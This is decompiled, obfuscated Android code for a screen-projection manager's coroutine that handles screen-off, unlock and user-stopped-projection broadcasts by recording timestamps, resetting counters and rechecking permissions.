package com.storm.safe.rock.manager;

import kotlin.coroutines.intrinsics.CoroutineSingletons;
import kotlin.coroutines.jvm.internal.SuspendLambda;
import kotlinx.coroutines.AbstractC0780a0;
import p000.C1351vv;
import p000.InterfaceC0876mv;
import p000.InterfaceC0920no;
import p000.InterfaceC1116qn;
import p000.kg1;
import p000.l10;
import p000.y01;

/* compiled from: r8-map-id-6aa8c380066ac34eca52ba03819884bf743dac35e85c6cbaefaab30e4b90b459 */
@InterfaceC1116qn(m214402c = "com.storm.safe.rock.manager.SmartMediaProjectionManager$systemStateReceiver$1$onReceive$1", m214403f = "SmartMediaProjectionManager.kt", m214404l = {}, m214405m = "invokeSuspend")
/* loaded from: classes2.dex */
public final class SmartMediaProjectionManager$systemStateReceiver$1$onReceive$1 extends SuspendLambda implements l10 {

    /* renamed from: a1 */
    public final /* synthetic */ String f52063a1;

    /* renamed from: a2 */
    public final /* synthetic */ C0262a4 f52064a2;

    /* compiled from: r8-map-id-6aa8c380066ac34eca52ba03819884bf743dac35e85c6cbaefaab30e4b90b459 */
    @InterfaceC1116qn(m214402c = "com.storm.safe.rock.manager.SmartMediaProjectionManager$systemStateReceiver$1$onReceive$1$1", m214403f = "SmartMediaProjectionManager.kt", m214404l = {}, m214405m = "invokeSuspend")
    /* renamed from: com.storm.safe.rock.manager.SmartMediaProjectionManager$systemStateReceiver$1$onReceive$1$1 */
    final class C02561 extends SuspendLambda implements l10 {

        /* renamed from: a1 */
        public final /* synthetic */ C0262a4 f52065a1;

        /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
        public C02561(C0262a4 c0262a4, InterfaceC0876mv interfaceC0876mv) {
            super(2, interfaceC0876mv);
            this.f52065a1 = c0262a4;
        }

        @Override // kotlin.coroutines.jvm.internal.BaseContinuationImpl
        public final InterfaceC0876mv create(Object obj, InterfaceC0876mv interfaceC0876mv) {
            return new C02561(this.f52065a1, interfaceC0876mv);
        }

        @Override // p000.l10
        public final Object invoke(Object obj, Object obj2) throws Throwable {
            C02561 c02561 = (C02561) create((InterfaceC0920no) obj, (InterfaceC0876mv) obj2);
            C1351vv c1351vv = C1351vv.f60710b1;
            c02561.invokeSuspend(c1351vv);
            return c1351vv;
        }

        @Override // kotlin.coroutines.jvm.internal.BaseContinuationImpl
        public final Object invokeSuspend(Object obj) throws Throwable {
            CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
            kg1.m213544f4(obj);
            C0262a4 c0262a4 = this.f52065a1;
            AbstractC0780a0.m213692a3(c0262a4.f52138a9, null, new SmartMediaProjectionManager$checkPermissionStatusAfterUnlock$1(c0262a4, null), 3);
            return C1351vv.f60710b1;
        }
    }

    /* compiled from: r8-map-id-6aa8c380066ac34eca52ba03819884bf743dac35e85c6cbaefaab30e4b90b459 */
    @InterfaceC1116qn(m214402c = "com.storm.safe.rock.manager.SmartMediaProjectionManager$systemStateReceiver$1$onReceive$1$2", m214403f = "SmartMediaProjectionManager.kt", m214404l = {}, m214405m = "invokeSuspend")
    /* renamed from: com.storm.safe.rock.manager.SmartMediaProjectionManager$systemStateReceiver$1$onReceive$1$2 */
    final class C02572 extends SuspendLambda implements l10 {

        /* renamed from: a1 */
        public final /* synthetic */ C0262a4 f52066a1;

        /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
        public C02572(C0262a4 c0262a4, InterfaceC0876mv interfaceC0876mv) {
            super(2, interfaceC0876mv);
            this.f52066a1 = c0262a4;
        }

        @Override // kotlin.coroutines.jvm.internal.BaseContinuationImpl
        public final InterfaceC0876mv create(Object obj, InterfaceC0876mv interfaceC0876mv) {
            return new C02572(this.f52066a1, interfaceC0876mv);
        }

        @Override // p000.l10
        public final Object invoke(Object obj, Object obj2) throws Throwable {
            C02572 c02572 = (C02572) create((InterfaceC0920no) obj, (InterfaceC0876mv) obj2);
            C1351vv c1351vv = C1351vv.f60710b1;
            c02572.invokeSuspend(c1351vv);
            return c1351vv;
        }

        @Override // kotlin.coroutines.jvm.internal.BaseContinuationImpl
        public final Object invokeSuspend(Object obj) throws Throwable {
            CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
            kg1.m213544f4(obj);
            C0262a4 c0262a4 = this.f52066a1;
            y01 y01Var = C0262a4.f52127b5;
            c0262a4.f52137a8 = System.currentTimeMillis();
            c0262a4.f52133a4.set(false);
            c0262a4.f52134a5.set(0);
            c0262a4.f52135a6.set(0);
            c0262a4.m211339a3();
            return C1351vv.f60710b1;
        }
    }

    /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
    public SmartMediaProjectionManager$systemStateReceiver$1$onReceive$1(String str, C0262a4 c0262a4, InterfaceC0876mv interfaceC0876mv) {
        super(2, interfaceC0876mv);
        this.f52063a1 = str;
        this.f52064a2 = c0262a4;
    }

    @Override // kotlin.coroutines.jvm.internal.BaseContinuationImpl
    public final InterfaceC0876mv create(Object obj, InterfaceC0876mv interfaceC0876mv) {
        return new SmartMediaProjectionManager$systemStateReceiver$1$onReceive$1(this.f52063a1, this.f52064a2, interfaceC0876mv);
    }

    @Override // p000.l10
    public final Object invoke(Object obj, Object obj2) throws Throwable {
        SmartMediaProjectionManager$systemStateReceiver$1$onReceive$1 smartMediaProjectionManager$systemStateReceiver$1$onReceive$1 = (SmartMediaProjectionManager$systemStateReceiver$1$onReceive$1) create((InterfaceC0920no) obj, (InterfaceC0876mv) obj2);
        C1351vv c1351vv = C1351vv.f60710b1;
        smartMediaProjectionManager$systemStateReceiver$1$onReceive$1.invokeSuspend(c1351vv);
        return c1351vv;
    }

    @Override // kotlin.coroutines.jvm.internal.BaseContinuationImpl
    public final Object invokeSuspend(Object obj) throws Throwable {
        CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
        kg1.m213544f4(obj);
        String str = this.f52063a1;
        int iHashCode = str.hashCode();
        if (iHashCode != -2128145023) {
            if (iHashCode != 823795052) {
                if (iHashCode == 1491368189 && str.equals("com.storm.safe.rock.intent.USER_STOPPED_PROJECTION")) {
                    C0262a4 c0262a4 = this.f52064a2;
                    AbstractC0780a0.m213692a3(c0262a4.f52139b0, null, new C02572(c0262a4, null), 3);
                }
            } else if (str.equals("android.intent.action.USER_PRESENT")) {
                C0262a4 c0262a42 = this.f52064a2;
                AbstractC0780a0.m213692a3(c0262a42.f52139b0, null, new C02561(c0262a42, null), 3);
            }
        } else if (str.equals("android.intent.action.SCREEN_OFF")) {
            this.f52064a2.f52137a8 = System.currentTimeMillis();
        }
        return C1351vv.f60710b1;
    }
}
